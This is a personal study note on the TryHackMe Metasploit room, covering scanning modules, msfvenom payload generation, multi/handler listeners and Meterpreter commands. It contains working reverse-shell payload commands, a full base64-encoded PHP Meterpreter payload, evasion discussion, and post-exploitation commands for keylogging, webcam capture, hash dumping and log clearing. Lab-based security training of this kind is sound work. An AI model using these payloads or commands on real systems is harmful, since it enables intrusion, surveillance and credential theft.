---
title:  "TryHackMe - Metasploit"
tags:
  - cs/hacking
  - cs/hacking/thm
  - cs/hacking/metasploit
programming-languages:
created: 2022-07-17
---
# Metasploit
---
Docs: https://docs.metasploit.com/

Metasploit is the most widely used exploitation framework. Metasploit is a powerful tool that can support all phases of a penetration testing engagement, from information gathering to post-exploitation.

The Metasploit Framework is a set of tools that allow information gathering, scanning, exploitation, exploit development, post-exploitation, and more. While the primary usage of the Metasploit Framework focuses on the penetration testing domain, it is also useful for vulnerability research and exploit development.

The main components of the Metasploit Framework can be summarised as follows;
-   **msfconsole**: The main command-line interface.
-   **Modules**: supporting modules such as exploits, scanners, payloads, etc.
-   **Tools**: Stand-alone tools that will help vulnerability research, vulnerability assessment, or penetration testing. Some of these tools are msfvenom, pattern\_create and pattern\_offset.

## Main Components
-   **Exploit:** A piece of code that uses a vulnerability present on the target system.
-   **Vulnerability:** A design, coding, or logic flaw affecting the target system. The exploitation of a vulnerability can result in disclosing confidential information or allowing the attacker to execute code on the target system.
-   **Payload:** An exploit will take advantage of a vulnerability. However, if we want the exploit to have the result we want (gaining access to the target system, read confidential information, etc.), we need to use a payload. Payloads are the code that will run on the target system.

Modules and categories under each one are listed below. These are given for reference purposes, but you will interact with them through the Metasploit console (msfconsole).

**Auxiliary**: Any supporting module, such as scanners, crawlers and fuzzers, can be found here.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/603df7900d7b6f1dff18b0bd/room-content/aaeb4ff4aa7fc33289b2bb581d874f16.png)

**Encoders**: Encoders will allow you to encode the exploit and payload in the hope that a signature-based antivirus solution may miss them.

Signature-based antivirus and security solutions have a database of known threats. They detect threats by comparing suspicious files to this database and raise an alert if there is a match. Thus encoders can have a limited success rate as antivirus solutions can perform additional checks.  

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/603df7900d7b6f1dff18b0bd/room-content/814490c07d05616009169c80cbb173a5.png)

**Evasion**: While encoders will encode the payload, they should not be considered a direct attempt to evade antivirus software.

On the other hand, “evasion” modules will try that, with more or less success.  

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/603df7900d7b6f1dff18b0bd/room-content/fe66d8ad4c915fa496a20e6f6291a0ad.png)

**Exploits**: Exploits, neatly organised by target system.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/603df7900d7b6f1dff18b0bd/room-content/b940db3ff6ec430322206f2e161114fc.png)

**NOPs**: NOPs (No OPeration) do nothing, literally.

They are represented in the Intel x86 CPU family they are represented with 0x90, following which the CPU will do nothing for one cycle. They are often used as a buffer to achieve consistent payload sizes.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/603df7900d7b6f1dff18b0bd/room-content/71c6dee3ef13c5bc841aac92ce3253d7.png)

**Payloads**: Payloads are codes that will run on the target system.

Exploits will leverage a vulnerability on the target system, but to achieve the desired result, we will need a payload. Examples could be; getting a shell, loading a malware or backdoor to the target system, running a command, or launching calc.exe as a proof of concept to add to the penetration test report. Starting the calculator on the target system remotely by launching the calc.exe application is a benign way to show that we can run commands on the target system.

Running command on the target system is already an important step but having an interactive connection that allows you to type commands that will be executed on the target system is better. Such an interactive command line is called a "shell". Metasploit offers the ability to send different payloads that can open shells on the target system.
  
![](https://tryhackme-images.s3.amazonaws.com/user-uploads/603df7900d7b6f1dff18b0bd/room-content/a4c9a90b50c7c46a6c8c1a5f78500ad1.png)

You will see three different directories under payloads: singles, stagers and stages.

-   **Singles:** Self-contained payloads (add user, launch notepad.exe, etc.) that do not need to download an additional component to run.
-   **Stagers:** Responsible for setting up a connection channel between Metasploit and the target system. Useful when working with staged payloads. “Staged payloads” will first upload a stager on the target system then download the rest of the payload (stage). This provides some advantages as the initial size of the payload will be relatively small compared to the full payload sent at once.
-   **Stages:** Downloaded by the stager. This will allow you to use larger sized payloads.

Metasploit has a subtle way to help you identify single (also called “inline”) payloads and staged payloads.

-  `generic/shell\_reverse\_tcp`
-   `windows/x64/shell/reverse\_tcp`

Both are reverse Windows shells. The former is an inline (or single) payload, as indicated by the “\_” between “shell” and “reverse”. While the latter is a staged payload, as indicated by the “/” between “shell” and “reverse”.

**Post:** Post modules will be useful on the final stage of the penetration testing process listed above, post-exploitation.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/603df7900d7b6f1dff18b0bd/room-content/fa98b51a9b3862dc43eb0d3007057290.png)

## Exploit Ranking
![](https://tryhackme-images.s3.amazonaws.com/user-uploads/603df7900d7b6f1dff18b0bd/room-content/a88c8d37283878e01447853a68578deb.png)

## Scanning
To port scan can use:

```
           msf6 > search portscan

Matching Modules
================

   #  Name                                              Disclosure Date  Rank    Check  Description
   -  ----                                              ---------------  ----    -----  -----------
   0  auxiliary/scanner/http/wordpress_pingback_access                   normal  No     Wordpress Pingback Locator
   1  auxiliary/scanner/natpmp/natpmp_portscan                           normal  No     NAT-PMP External Port Scanner
   2  auxiliary/scanner/portscan/ack                                     normal  No     TCP ACK Firewall Scanner
   3  auxiliary/scanner/portscan/ftpbounce                               normal  No     FTP Bounce Port Scanner
   4  auxiliary/scanner/portscan/syn                                     normal  No     TCP SYN Port Scanner
   5  auxiliary/scanner/portscan/tcp                                     normal  No     TCP Port Scanner
   6  auxiliary/scanner/portscan/xmas                                    normal  No     TCP "XMas" Port Scanner
   7  auxiliary/scanner/sap/sap_router_portscanner                       normal  No     SAPRouter Port Scanner


Interact with a module by name or index, for example use 7 or use auxiliary/scanner/sap/sap_router_portscanner

msf6 >
        
```

Port scanning modules will require you to set a few options:

```
           msf6 auxiliary(scanner/portscan/tcp) > show options

Module options (auxiliary/scanner/portscan/tcp):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   CONCURRENCY  10               yes       The number of concurrent ports to check per host
   DELAY        0                yes       The delay between connections, per thread, in milliseconds
   JITTER       0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.
   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
   RHOSTS                        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:'
   THREADS      1                yes       The number of concurrent threads (max one per host)
   TIMEOUT      1000             yes       The socket connect timeout in milliseconds

msf6 auxiliary(scanner/portscan/tcp) >
        
```

-   **CONCURRENCY:** Number of targets to be scanned simultaneously.
-   **PORTS:** Port range to be scanned. Please note that 1-1000 here will not be the same as using Nmap with the default configuration. Nmap will scan the 1000 most used ports, while Metasploit will scan port numbers from 1 to 10000.
-   **RHOSTS:** Target or target network to be scanned.
-   **THREADS:** Number of threads that will be used simultaneously. More threads will result in faster scans.

You can directly perform Nmap scans from the msfconsole prompt as shown below faster:  

Using Nmap from the Msfconsole prompt

```
           msf6 > nmap -sS 10.10.12.229
[*] exec: nmap -sS 10.10.12.229


Starting Nmap 7.60 ( https://nmap.org ) at 2021-08-20 03:54 BST
Nmap scan report for ip-10-10-12-229.eu-west-1.compute.internal (10.10.12.229)
Host is up (0.0011s latency).
Not shown: 992 closed ports
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49158/tcp open  unknown
MAC Address: 02:CE:59:27:C8:E3 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 64.19 seconds
msf6 >
        
```

As for information gathering, if your engagement requires a speedier approach to port scanning, Metasploit may not be your first choice. However, a number of modules make Metasploit a useful tool for the scanning phase.

### UDP service Identification
The `scanner/discovery/udp_sweep` module will allow you to quickly identify services running over the UDP (User Datagram Protocol). As you can see below, this module will not conduct an extensive scan of all possible UDP services but does provide a quick way to identify services such as DNS or NetBIOS.

### UDP scan
```
           msf6 auxiliary(scanner/discovery/udp_sweep) > run

[*] Sending 13 probes to 10.10.12.229->10.10.12.229 (1 hosts)
[*] Discovered NetBIOS on 10.10.12.229:137 (JON-PC::U :WORKGROUP::G :JON-PC::U :WORKGROUP::G :WORKGROUP::U :__MSBROWSE__::G :02:ce:59:27:c8:e3)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/discovery/udp_sweep) >
        
```

### SMB Scans
Metasploit offers several useful auxiliary modules that allow us to scan specific services. Below is an example for the SMB. Especially useful in a corporate network would be `smb_enumshares` and `smb_version` but please spend some time to identify scanners that the Metasploit version installed on your system offers.

```bash
           msf6 auxiliary(scanner/smb/smb_version) > run

[+] 10.10.12.229:445      - Host is running Windows 7 Professional SP1 (build:7601) (name:JON-PC) (workgroup:WORKGROUP ) (signatures:optional)
[*] 10.10.12.229:445      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/smb/smb_version) >
        
```

When performing service scans, it would be important not to omit more "exotic" services such as NetBIOS. NetBIOS (Network Basic Input Output System), similar to SMB, allows computers to communicate over the network to share files or send files to printers. The NetBIOS name of the target system can give you an idea about its role and even importance (e.g. CORP-DC, DEVOPS, SALES, etc.). You may also run across some shared files and folders that could be accessed either without a password or protected with a simple password (e.g. admin, administrator, root, toor, etc.).

## MsfVenom
Msfvenom, which replaced Msfpayload and Msfencode, allows you to generate payloads.  
  
Msfvenom will allow you to access all payloads available in the  Metasploit framework. Msfvenom allows you to create payloads in many different formats (PHP, exe, dll, elf, etc.) and for many different target systems (Apple, Windows, Android, Linux, etc.).  

Msfvenom payloads:

```
           root@ip-10-10-186-44:~# msfvenom -l payloads 

Framework Payloads (562 total) [--payload ]
==================================================

    Name                                                Description
    ----                                                -----------
    aix/ppc/shell_bind_tcp                              Listen for a connection and spawn a command shell
    aix/ppc/shell_find_port                             Spawn a shell on an established connection
    aix/ppc/shell_interact                              Simply execve /bin/sh (for inetd programs)
    aix/ppc/shell_reverse_tcp                           Connect back to attacker and spawn a command shell
    android/meterpreter/reverse_http                    Run a meterpreter server in Android. Tunnel communication over HTTP
    android/meterpreter/reverse_https                   Run a meterpreter server in Android. Tunnel communication over HTTPS
    android/meterpreter/reverse_tcp                     Run a meterpreter server in Android. Connect back stager
    android/meterpreter_reverse_http                    Connect back to attacker and spawn a Meterpreter shell
    android/meterpreter_reverse_https                   Connect back to attacker and spawn a Meterpreter shell
    android/meterpreter_reverse_tcp                     Connect back to the attacker and spawn a Meterpreter shell
    android/shell/reverse_http                          Spawn a piped command shell (sh). Tunnel communication over HTTP
    android/shell/reverse_https                         Spawn a piped command shell (sh). Tunnel communication over HTTPS
    android/shell/reverse_tcp                           Spawn a piped command shell (sh). Connect back stager
    apple_ios/aarch64/meterpreter_reverse_http          Run the Meterpreter / Mettle server payload (stageless)
    apple_ios/aarch64/meterpreter_reverse_https         Run the Meterpreter / Mettle server payload (stageless)
    apple_ios/aarch64/meterpreter_reverse_tcp           Run the Meterpreter / Mettle server payload (stageless)
    apple_ios/aarch64/shell_reverse_tcp                 Connect back to attacker and spawn a command shell
    apple_ios/armle/meterpreter_reverse_http            Run the Meterpreter / Mettle server payload (stageless)
    apple_ios/armle/meterpreter_reverse_https           Run the Meterpreter / Mettle server payload (stageless)
    apple_ios/armle/meterpreter_reverse_tcp             Run the Meterpreter / Mettle server payload (stageless)
        
```

### Output formats
You can either generate stand-alone payloads (e.g. a Windows executable for Meterpreter) or get a usable raw format (e.g. python). The`msfvenom --list formats` command can be used to list supported output formats

### Encoders
Contrary to some beliefs, encoders do not aim to bypass antivirus installed on the target system. As the name suggests, they encode the payload. While it can be effective against some antivirus software, using modern obfuscation techniques or learning methods to inject shellcode is a better solution to the problem. The example below shows the usage of encoding (with the `-e` parameter. The PHP version of Meterpreter was encoded in Base64, and the output format was `raw`.

Generating a PHP payload:

```
           root@ip-10-10-186-44:~# msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of php/base64
php/base64 succeeded with size 1507 (iteration=0)
php/base64 chosen with final size 1507
Payload size: 1507 bytes
eval(base64_decode(Lyo8P3BocCAvKiovIGVycm9yX3JlcG9ydGluZygwKTsgJGlwID0gJzEwLjEwLjE4Ni40NCc7ICRwb3J0ID0gNDQ0NDsgaWYgKCgkZiA9ICdzdHJlYW1fc29ja2V0X2NsaWVudCcpICYmIGlzX2NhbGxhYmxlKCRmKSkgeyAkcyA9ICRmKCJ0Y3A6Ly97JGlwfTp7JHBvcnR9Iik7ICRzX3R5cGUgPSAnc3RyZWFtJzsgfSBpZiAoISRzICYmICgkZiA9ICdmc29ja29wZW4nKSAmJiBpc19jYWxsYWJsZSgkZikpIHsgJHMgPSAkZigkaXAsICRwb3J0KTsgJHNfdHlwZSA9ICdzdHJlYW0nOyB9IGlmICghJHMgJiYgKCRmID0gJ3NvY2tldF9jcmVhdGUnKSAmJiBpc19jYWxsYWJsZSgkZikpIHsgJHMgPSAkZihBRl9JTkVULCBTT0NLX1NUUkVBTSwgU09MX1RDUCk7ICRyZXMgPSBAc29ja2V0X2Nvbm5lY3QoJHMsICRpcCwgJHBvcnQpOyBpZiAoISRyZXMpIHsgZGllKCk7IH0gJHNfdHlwZSA9ICdzb2NrZXQnOyB9IGlmICghJHNfdHlwZSkgeyBkaWUoJ25vIHNvY2tldCBmdW5jcycpOyB9IGlmICghJHMpIHsgZGllKCdubyBzb2NrZXQnKTsgfSBzd2l0Y2ggKCRzX3R5cGUpIHsgY2FzZSAnc3RyZWFtJzogJGxlbiA9IGZyZWFkKCRzLCA0KTsgYnJlYWs7IGNhc2UgJ3NvY2tldCc6ICRsZW4gPSBzb2NrZXRfcmVhZCgkcywgNCk7IGJyZWFrOyB9IGlmICghJGxlbikgeyBkaWUoKTsgfSAkYSA9IHVucGFjaygi.TmxlbiIsICRsZW4pOyAkbGVuID0gJGFbJ2xlbiddOyAkYiA9ICcnOyB3aGlsZSAoc3RybGVuKCRiKSA8ICRsZW4pIHsgc3dpdGNoICgkc190eXBlKSB7IGNhc2UgJ3N0cmVhbSc6ICRiIC49IGZyZWFkKCRzLCAkbGVuLXN0cmxlbigkYikpOyBicmVhazsgY2FzZSAnc29ja2V0JzogJGIgLj0gc29ja2V0X3JlYWQoJHMsICRsZW4tc3RybGVuKCRiKSk7IGJyZWFrOyB9IH0gJEdMT0JBTFNbJ21zZ3NvY2snXSA9ICRzOyAkR0xPQkFMU1snbXNnc29ja190eXBlJ10gPSAkc190eXBlOyBpZiAoZXh0ZW5zaW9uX2xvYWRlZCgnc3Vob3NpbicpICYmIGluaV9nZXQoJ3N1aG9zaW4uZXhlY3V0b3IuZGlzYWJsZV9ldmFsJykpIHsgJHN1aG9zaW5fYnlwYXNzPWNyZWF0ZV9mdW5jdGlvbignJywgJGIpOyAkc3Vob3Npbl9ieXBhc3MoKTsgfSBlbHNlIHsgZXZhbCgkYik7IH0gZGllKCk7));
root@ip-10-10-186-44:~#
        
```
  
### Handlers
Similar to exploits using a reverse shell, you will need to be able to accept incoming connections generated by the MSFvenom payload. When using an exploit module, this part is automatically handled by the exploit module, you will remember how the `payload options` title appeared when setting a reverse shell. The term commonly used to receive a connection from a target is 'catching a shell'. Reverse shells or Meterpreter callbacks generated in your MSFvenom payload can be easily caught using a handler.

The following scenario may be familiar; we will exploit the file upload vulnerability present in DVWA (Damn Vulnerable Web Application). For the exercises in this task, you will need to replicate a similar scenario on another target system, DVWA was used here for illustration purposes. The exploit steps are;

1.  Generate the PHP shell using MSFvenom
2.  Start the Metasploit handler
3.  Execute the PHP shell  
    

MSFvenom will require a payload, the local machine IP address, and the local port to which the payload will connect. Seen below, 10.0.2.19 is the IP address of a Kali Linux machine used in the attack and local port 7777 was chosen.

Generating a PHP reverse shell

```
           root@ip-10-0-2-19:~# msfvenom -p php/reverse_php LHOST=10.0.2.19 LPORT=7777 -f raw > reverse_shell.php
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 3020 bytes
root@ip-10-0-2-19:~#
        
```

Please note: The output PHP file will miss the starting PHP tag commented and the end tag (`?>`), as seen below.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/603df7900d7b6f1dff18b0bd/room-content/d82319bb6e03f8fbd8d005da9c31e59d.png)  

The reverse\_shell.php file should be edited to convert it into a working PHP file. 

Below: Comments removed from the beginning of the file.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/603df7900d7b6f1dff18b0bd/room-content/49c2132c9bd568cc3201bb38ed4ff7a0.png)  

Below: End tag added

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/603df7900d7b6f1dff18b0bd/room-content/ae579463375c5847a0b99d46f93c4142.png)  

We will use Multi Handler to receive the incoming connection. The module can be used with the `use exploit/multi/handler` command.

Multi handler supports all Metasploit payloads and can be used for Meterpreter as well as regular shells.

To use the module, we will need to set the payload value (`php/reverse_php` in this case), the LHOST, and LPORT values.

Setting up the listener:

```
           msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > set payload php/reverse_php
payload => php/reverse_php
msf5 exploit(multi/handler) > set lhost 10.0.2.19
lhost => 10.0.2.19
msf6 exploit(multi/handler) > set lport 7777
lport => 7777
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (php/reverse_php):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.0.2.19        yes       The listen address (an interface may be specified)
   LPORT  7777             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) >
        
```

Once everything is set, we will `run` the handler and wait for the incoming connection.

Waiting for the reverse shell:

```
           msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.186.44:7777
        
```

When the reverse shell is triggered, the connection will be received by multi/handler and provide us with a shell.

If the payload was set as Meterpreter (e.g. in a Windows executable format), multi/handler would then provide us with a Meterpreter shell.

### Other Payloads
Based on the target system's configuration (operating system, install webserver, installed interpreter, etc.), msfvenom can be used to create payloads in almost all formats. Below are a few examples you will often use:

In all these examples, LHOST will be the IP address of your attacking machine, and LPORT will be the port on which your handler will listen.  
  
Linux Executable and Linkable Format (elf)  
`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf`  
The .elf format is comparable to the .exe format in Windows. These are executable files for Linux. However, you may still need to make sure they have executable permissions on the target machine. For example, once you have the shell.elf file on your target machine, use the chmod +x shell.elf command to accord executable permissions. Once done, you can run this file by typing ./shell.elf on the target machine command line.  
  
Windows  
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe`  
  
PHP  
`msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php`  
  
ASP  
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp`  
  
Python  
`msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py`  
  
All of the examples above are reverse payloads. This means you will need to have the exploit/multi/handler module listening on your attacking machine to work as a handler. You will need to set up the handler accordingly with the payload, LHOST and LPORT parameters. These values will be the same you have used when creating the msfvenom payload.

## Meterpreter
Meterpreter is a Metasploit payload that supports the penetration testing process with many valuable components. Meterpreter will run on the target system and act as an agent within a command and control architecture. You will interact with the target operating system and files and use Meterpreter's specialized commands.

Meterpreter has many versions which will provide different functionalities based on the target system.

**How does Meterpreter work?**

Meterpreter runs on the target system but is not installed on it. It runs in memory and does not write itself to the disk on the target. This feature aims to avoid being detected during antivirus scans. By default, most antivirus software will scan new files on the disk (e.g. when you download a file from the internet) Meterpreter runs in memory (RAM - Random Access Memory) to avoid having a file that has to be written to the disk on the target system (e.g. meterpreter.exe). This way, Meterpreter will be seen as a process and not have a file on the target system.

Meterpreter also aims to avoid being detected by network-based IPS (Intrusion Prevention System) and IDS (Intrusion Detection System) solutions by using encrypted communication with the server where Metasploit runs (typically your attacking machine). If the target organization does not decrypt and inspect encrypted traffic (e.g. HTTPS) coming to and going out of the local network, IPS and IDS solutions will not be able to detect its activities.  

While Meterpreter is recognized by major antivirus software, this feature provides some degree of stealth.

The example below shows a target Windows machine exploited using the MS17-010 vulnerability. You will see Meterpreter is running with a process ID (PID) of 1304; this PID will be different in your case. We have used the `getpid` command, which returns the process ID with which Meterpreter is running. The process ID (or process identifier) is used by operating systems to identify running processes. All processes running in Linux or Windows will have a unique ID number; this number is used to interact with the process when the need arises (e.g. if it needs to be stopped).

Getpid

```
           meterpreter > getpid 
Current pid: 1304
        
```

If we list processes running on the target system using the `ps` command, we see PID 1304 is spoolsv.exe and not Meterpreter.exe, as one might expect.

The ps command

```
           meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 0     0     [System Process]                                                   
 4     0     System                x64   0                                      
 396   644   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exe
 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
 428   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           
 548   540   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 596   540   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
 604   588   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 644   588   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
 692   596   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
 700   692   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE  
 716   596   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe  1276  1304  cmd.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\cmd.exe
 1304  692   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1340  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    
 1388  548   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
        
```

Even if we were to go a step further and look at DLLs (Dynamic-Link Libraries) used by the Meterpreter process (PID 1304 in this case), we still would not find anything jumping at us (e.g. no meterpreter.dll)

The Meterpreter process

```
           C:\Windows\system32>tasklist /m /fi "pid eq 1304"
tasklist /m /fi "pid eq 1304"

Image Name                     PID Modules                                     
========================= ======== ============================================
spoolsv.exe                   1304 ntdll.dll, kernel32.dll, KERNELBASE.dll,    
                                   msvcrt.dll, sechost.dll, RPCRT4.dll,        
                                   USER32.dll, GDI32.dll, LPK.dll, USP10.dll,  
                                   POWRPROF.dll, SETUPAPI.dll, CFGMGR32.dll,   
                                   ADVAPI32.dll, OLEAUT32.dll, ole32.dll,      
                                   DEVOBJ.dll, DNSAPI.dll, WS2_32.dll,         
                                   NSI.dll, IMM32.DLL, MSCTF.dll,              
                                   CRYPTBASE.dll, slc.dll, RpcRtRemote.dll,    
                                   secur32.dll, SSPICLI.DLL, credssp.dll,      
                                   IPHLPAPI.DLL, WINNSI.DLL, mswsock.dll,      
                                   wshtcpip.dll, wship6.dll, rasadhlp.dll,     
                                   fwpuclnt.dll, CLBCatQ.DLL, umb.dll,         
                                   ATL.DLL, WINTRUST.dll, CRYPT32.dll,         
                                   MSASN1.dll, localspl.dll, SPOOLSS.DLL,      
                                   srvcli.dll, winspool.drv,                   
                                   PrintIsolationProxy.dll, FXSMON.DLL,        
                                   tcpmon.dll, snmpapi.dll, wsnmp32.dll,       
                                   msxml6.dll, SHLWAPI.dll, usbmon.dll,        
                                   wls0wndh.dll, WSDMon.dll, wsdapi.dll,       
                                   webservices.dll, FirewallAPI.dll,           
                                   VERSION.dll, FunDisc.dll, fdPnp.dll,        
                                   winprint.dll, USERENV.dll, profapi.dll,     
                                   GPAPI.dll, dsrole.dll, win32spl.dll,        
                                   inetpp.dll, DEVRTL.dll, SPINF.dll,          
                                   CRYPTSP.dll, rsaenh.dll, WINSTA.dll,        
                                   cscapi.dll, netutils.dll, WININET.dll,      
                                   urlmon.dll, iertutil.dll, WINHTTP.dll,      
                                   webio.dll, SHELL32.dll, MPR.dll,            
                                   NETAPI32.dll, wkscli.dll, PSAPI.DLL,        
                                   WINMM.dll, dhcpcsvc6.DLL, dhcpcsvc.DLL,     
                                   apphelp.dll, NLAapi.dll, napinsp.dll,       
                                   pnrpnsp.dll, winrnr.dll                     

C:\Windows\system32>
        
```

Typing help on any Meterpreter session (shown by meterpreter> at the prompt) will list all available commands.

The Meterpreter help menu

           
meterpreter > help

Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    bg                        Alias for background
    bgkill                    Kills a background meterpreter script
    bglist                    Lists running background scripts
    bgrun                     Executes a meterpreter script as a background thread
    channel                   Displays information or control active channels
    close                     Closes a channel[...]

        


Every version of Meterpreter will have different command options, so running the help command is always a good idea. Commands are built-in tools available on Meterpreter. They will run on the target system without loading any additional script or executable files.


Meterpreter will provide you with three primary categories of tools;

    Built-in commands
    Meterpreter tools
    Meterpreter scripting

If you run the help command, you will see Meterpreter commands are listed under different categories.

    Core commands
    File system commands
    Networking commands
    System commands
    User interface commands
    Webcam commands
    Audio output commands
    Elevate commands
    Password database commands
    Timestomp commands

Please note that the list above was taken from the output of the help command on the Windows version of Meterpreter (windows/x64/meterpreter/reverse_tcp). These will be different for other Meterpreter versions.

Meterpreter commands
Core commands will be helpful to navigate and interact with the target system. Below are some of the most commonly used. Remember to check all available commands running the help command once a Meterpreter session has started.


Core commands

    background: Backgrounds the current session
    exit: Terminate the Meterpreter session
    guid: Get the session GUID (Globally Unique Identifier)
    help: Displays the help menu
    info: Displays information about a Post module
    irb: Opens an interactive Ruby shell on the current session
    load: Loads one or more Meterpreter extensions
    migrate: Allows you to migrate Meterpreter to another process
    run: Executes a Meterpreter script or Post module
    sessions: Quickly switch to another session

File system commands

    cd: Will change directory
    ls: Will list files in the current directory (dir will also work)
    pwd: Prints the current working directory
    edit: will allow you to edit a file
    cat: Will show the contents of a file to the screen
    rm: Will delete the specified file
    search: Will search for files
    upload: Will upload a file or directory
    download: Will download a file or directory

Networking commands

    arp: Displays the host ARP (Address Resolution Protocol) cache
    ifconfig: Displays network interfaces available on the target system
    netstat: Displays the network connections
    portfwd: Forwards a local port to a remote service
    route: Allows you to view and modify the routing table

System commands

    clearev: Clears the event logs
    execute: Executes a command
    getpid: Shows the current process identifier
    getuid: Shows the user that Meterpreter is running as
    kill: Terminates a process
    pkill: Terminates processes by name
    ps: Lists running processes
    reboot: Reboots the remote computer
    shell: Drops into a system command shell
    shutdown: Shuts down the remote computer
    sysinfo: Gets information about the remote system, such as OS

Others Commands (these will be listed under different menu categories in the help menu)

    idletime: Returns the number of seconds the remote user has been idle
    keyscan_dump: Dumps the keystroke buffer
    keyscan_start: Starts capturing keystrokes
    keyscan_stop: Stops capturing keystrokes
    screenshare: Allows you to watch the remote user's desktop in real time
    screenshot: Grabs a screenshot of the interactive desktop
    record_mic: Records audio from the default microphone for X seconds
    webcam_chat: Starts a video chat
    webcam_list: Lists webcams
    webcam_snap: Takes a snapshot from the specified webcam
    webcam_stream: Plays a video stream from the specified webcam
    getsystem: Attempts to elevate your privilege to that of local system
    hashdump: Dumps the contents of the SAM database

Although all these commands may seem available under the help menu, they may not all work. For example, the target system might not have a webcam, or it can be running on a virtual machine without a proper desktop environment. 